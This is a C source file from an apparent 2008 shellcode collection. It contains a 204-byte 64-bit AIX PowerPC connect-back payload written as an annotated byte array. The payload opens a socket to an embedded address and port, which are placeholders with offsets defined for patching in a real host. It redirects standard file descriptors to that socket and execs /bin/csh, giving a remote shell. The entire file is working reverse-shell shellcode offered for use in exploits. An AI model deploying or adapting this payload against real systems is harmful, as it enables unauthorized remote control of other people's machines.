/*
 *  $Id: aix-power-cntsockcode64.c 40 2008-11-17 02:45:30Z ramon $
 *
 *  aix-power-cntsockcode64.c - AIX Power Network connect code
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Currently supported AIX levels.
 * -DV530   AIX 5.3.0
 *
 */

#define CNTSOCKADDR 32
#define CNTSOCKPORT 30

char cntsockcode64[]=       /*  204 bytes                         */
    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
    "\x40\x82\xff\xfd"      /*  bnel    <cntsockcode64>           */
    "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
    "\x3b\xde\x01\xff"      /*  cal     r30,511(r30)              */
    "\x3b\xde\xfe\x25"      /*  cal     r30,-475(r30)             */
    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x20"      /*  bctr                              */
    "\xff\x02\x04\xd2"      /*  .long   0xff0204d2                */
    "\x7f\x00\x00\x01"      /*  .long   0x7f000001                */
    "\x4c\xc6\x33\x42"      /*  crorc   6,6,6                     */
    "\x44\xff\xff\x02"      /*  svca    0                         */
    "\x3b\xde\xff\xf8"      /*  cal     r30,-8(r30)               */
    "\x3b\xa0\x01\xff"      /*  lil     r29,511                   */
    "\x38\x9d\xfe\x02"      /*  cal     r4,-510(r29)              */
    "\x38\x7d\xfe\x03"      /*  cal     r3,-509(r29)              */
#ifdef V530
    "\x38\x5d\xfe\x8e"      /*  cal     r2,-370(r29)              */
#endif
    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x21"      /*  bctrl                             */
    "\x7c\x7c\x1b\x78"      /*  mr      r28,r3                    */
    "\x38\xbd\xfe\x11"      /*  cal     r5,-495(r29)              */
    "\x38\x9e\xff\xf8"      /*  cal     r4,-8(r30)                */
#ifdef V530
    "\x38\x5d\xfe\x8f"      /*  cal     r2,-369(r29)              */
#endif
    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x21"      /*  bctrl                             */
    "\x3b\x7d\xfe\x03"      /*  cal     r27,-509(r29)             */
    "\x7f\x63\xdb\x78"      /*  mr      r3,r27                    */
#ifdef V530
    "\x38\x5d\xfe\xa1"      /*  cal     r2,-351(r29)              */
#endif
    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x21"      /*  bctrl                             */
    "\x7f\x65\xdb\x78"      /*  mr      r5,r27                    */
    "\x7c\x84\x22\x78"      /*  xor     r4,r4,r4                  */
    "\x7f\x83\xe3\x78"      /*  mr      r3,r28                    */
#ifdef V530
    "\x38\x5d\xff\x43"      /*  cal     r2,-189(r29)              */
#endif
    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x21"      /*  bctrl                             */
    "\x37\x7b\xff\xff"      /*  ai.     r27,r27,-1                */
    "\x40\x80\xff\xd4"      /*  bge     <cntsockcode64+100>       */
    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
    "\x40\x82\xff\xfd"      /*  bnel    <cntsockcode64+148>       */
    "\x7f\x08\x02\xa6"      /*  mflr    r24                       */
    "\x3b\x18\x01\xff"      /*  cal     r24,511(r24)              */
    "\x38\x78\xfe\x29"      /*  cal     r3,-471(r24)              */
    "\x98\xb8\xfe\x31"      /*  stb     r5,-463(r24)              */
    "\xf8\xa1\xff\xf9"      /*  stdu    r5,-8(r1)                 */
    "\xf8\x61\xff\xf9"      /*  stdu    r3,-8(r1)                 */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
#ifdef V530
    "\x38\x5d\xfe\x06"      /*  cal     r2,-506(r29)              */
#endif
    "\x7f\xc9\x03\xa6"      /*  mtctr   r30                       */
    "\x4e\x80\x04\x20"      /*  bctr                              */
    "/bin/csh"
;
